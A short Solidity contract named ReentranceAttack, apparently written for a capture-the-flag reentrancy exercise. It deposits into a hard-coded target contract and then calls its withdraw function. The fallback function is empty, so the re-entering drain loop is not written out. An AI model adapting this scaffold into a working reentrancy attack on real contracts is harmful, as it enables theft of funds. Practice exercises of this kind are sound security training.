contract ReentranceAttack {
    address payable immutable deployer;
    IReentrance reentrance;

    constructor() payable {
        deployer = payable(msg.sender);
        reentrance = IReentrance(0x38fc379647e373dA9bbb1B01B14C0586E77d0D1E);
    }

    function init() external {
        uint256 amount = address(this).balance;
        reentrance.donate{value: amount}(address(this));
        reentrance.withdraw(amount);
    }

    fallback() external payable {
        
    }
}
